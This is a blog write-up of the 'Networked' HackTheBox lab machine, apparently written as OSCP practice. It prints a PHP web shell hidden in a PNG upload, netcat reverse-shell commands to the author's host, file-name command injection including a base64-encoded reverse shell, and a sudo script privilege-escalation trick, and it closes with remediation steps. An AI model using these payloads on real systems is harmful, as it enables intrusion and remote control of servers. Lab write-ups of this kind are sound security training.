---
layout: writeup
title: Networked - HackTheBox
date: 2024-08-14 13:32:20 +0300
description: A Writeup of the Networked Box from HackTheBox
image: # /assets/images/Networked/Networked.png
fig-caption: # Add figcaption (optional)
tags: [TJ Null, LainKusanagi, Linux]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Networked, and it is rated Easy by HackTheBox. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
```

Looks like we're going to be pentesting a web app, so I check out port 80 and find this:

![Networked2.png](/assets/images/Networked/Networked2.png){: .responsive-image}

Not much going on there, so I start feroxbuster and quickly find `http://10.10.10.146/uploads/` and `http://10.10.10.146/backup/backup.tar`, and that's about it. I download the backup.tar file and find: 

```
-rw-r--r--  1 pop  pop    229 Jul  9  2019 index.php
-rw-r--r--  1 pop  pop   2001 Jul  2  2019 lib.php
-rw-r--r--  1 pop  pop   1871 Jul  2  2019 photos.php
-rw-r--r--  1 pop  pop   1331 Jul  2  2019 upload.php
```

These php files are all available through the browser, so maybe if we read through them we can figure out how to exploit them. Upload.php seems to suggest the file types are limited to images. 

![Networked3.png](/assets/images/Networked/Networked3.png){: .responsive-image}

This fits with the photos.php page. 

![Networked4.png](/assets/images/Networked/Networked4.png){: .responsive-image}

Unfortunately when I browse to the upload.php page and attempt to upload any of these images, I get a `Invalid file type` response. It turns out this is because my sample files are too big. 

![Networked5.png](/assets/images/Networked/Networked5.png){: .responsive-image}

So I get another sample file and try again, and the upload works. 

![Networked6.png](/assets/images/Networked/Networked6.png){: .responsive-image}

It also change the file name to my ip address with `_`'s instead of `.`'s. So the game here is probably going to be to upload a shell of some kind, but making it look like a png file. That rules out ivan's PHP reverse shell by the way. So it will have to be something pretty small. From the code snippet above, we know that the upload.php only accepts image files, but we might be able to spoof them. 

Initially I try to do this by adding the magic bytes for PNG files (`89 50 4E 47 0D 0A 1A 0A`) and insuring that the Content-Type in the HTTP request is set to `image/png`. 
![Networked7.png](/assets/images/Networked/Networked7.png){: .responsive-image}

I can't seem to get this uploaded whether it's called `shell.php` or `shell.php.png`, so I decided to go another route and use a real sample png file, simply using `shell.php.png` as the file name and appending some php to the end. In my case I went with: 

```
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

This will allow me to open the file and use cmd as a parameter to send a command. Here I run the command as `whoami` and get the result of apache at the bottom. 

![Networked8.png](/assets/images/Networked/Networked8.png){: .responsive-image}
I fiddle with this for a while, trying a few options to get a shell (can't find an ssh key) and wind up with `http://10.10.10.146/uploads/10_10_14_3.php.png?cmd=nc+10.10.14.3+445+-e+/bin/bash` which gets me the shell:

![Networked9.png](/assets/images/Networked/Networked9.png){: .responsive-image}

I navigate to the `/home` directory and find that while I can access the only user's (guly) directory, I cannot read the user.txt file. I can read `crontab.guly` and `check_attack.php`. The crontab just shows that check_attack is being run, but check_attack looks like this:
```
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

Basically this is checking to see if there are any files in the that do not meet the criteria for file names that are established in the upload directory. They should be the IP address with the quartets separated by `_`'s. The command to remove the files is here:
`exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`

We know the path is `/var/www/html/uploads/$fileName`, but we set the $value with the file name. We couldn't have exploited this very easily from the web shell because the app changes the file name to the correct naming convention, but we can once we have a shell. If the file name includes perhaps a `;` or `&` then maybe the part after that will be executed. Initially I tried using the same shell I used to access the machine: `touch 'a; nc 10.10.14.3 445 -e /bin/bash; b'`, but I get an error, presumably because of the slashes: 

```
touch: cannot touch 'a; nc 10.10.14.3 445 -e /bin/bash; b': No such file or directory
```

So I change it to `touch 'a; nc 10.10.14.3 445 -e bash; b'`. That gets a hit on the machine and dies. Then I try creating a python shell and `touch a; python shell.py; b`, and that also gets a hit and dies. 

Given that the issue seems to be with the slashes, we can just use base64 to encode and then decode it. I'll use `nc 10.10.14.3 445 -e /bin/bash` and encode it. The full command then will be: 
`touch 'a; echo bmMgMTAuMTAuMTQuMyA4ODg4IC1lIC9iaW4vYmFzaA== | base64 -d | sh; b'`, adn this actually gets a stable shell. 


![Networked10.png](/assets/images/Networked/Networked10.png){: .responsive-image}

I grab the user.txt file and see what guly can do with `sudo -l`.

![Networked11.png](/assets/images/Networked/Networked11.png){: .responsive-image}

The changename.sh file looks like this:

![Networked12.png](/assets/images/Networked/Networked12.png){: .responsive-image}

This script is writing to the `ifcfg-guly` script based on input that I give it. It asks me for the input for `interface NAME`, `interface PROXY_METHOD`, `interface BROWSER_ONLY`, and `interface BOOTPROTO`. No matter what I put, I get an error:

```
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```
 But after trying a bunch of different things, it turns out that if there is a space in the variable, it will get executed as a command. So if the responses to the inputs are: `test /bin/bash`, `test`, `test`, and `test /bin/bash`, we get a root shell:

![Networked13.png](/assets/images/Networked/Networked13.png){: .responsive-image}

And then we can grab the root.txt. 

### Lessons Learned
Personally, I found this machine to be pretty difficult. I appreciate that it didn't fail the whole time I was doing it, but it took a while. Still, glad to have learned a few things:
- I'm use to editing the magic bytes and the MIME type, but I hadn't had the experience of using a real image file and appending a web shell to it. I'm a little frustrated that having the php files didn't really help me, as I still fiddled with it as though I didn't, but oh well. 
- Both privilege escalations took a while, and they seem like the involved unrealistic scripts. But they were good examples of how malicious code execution can work. I don't do a good enough job of manually splitting commands in situations like that, so it was good to have some practice with it. 
- After checking some other writeups after the fact, I found that while I could not use `nc 10.10.14.3 445 -e bash` to as the file name in the uploads directory, it worked for someone else with `nc 10.10.14.3 445 -c bash`. So it didn't actually need to be base64 encoded. I see both options on [revshells.com](https://www.revshells.com/), but I've never tried to use the latter, and now I know to give it a shot. 

### Remediation Steps
- Remove the ability for php files to be executed from the `/var/www/html/uploads` directory. Especially considering only image files should be there, there's no reason for php to execute. 
- Improve input validation on `/home/guly/check_attack.php`. It shouldn't be possible for commands to be executing with it based on file names. 
- If possible, change the way file names are allowed to be created. If they include `:` or `&` for example, they could be use for code execution if called by a script. 
- Similiarly improve input validation for `/usr/local/sbin/changename.sh`. A simply space in the input shouldn't allow the word after to be run as code.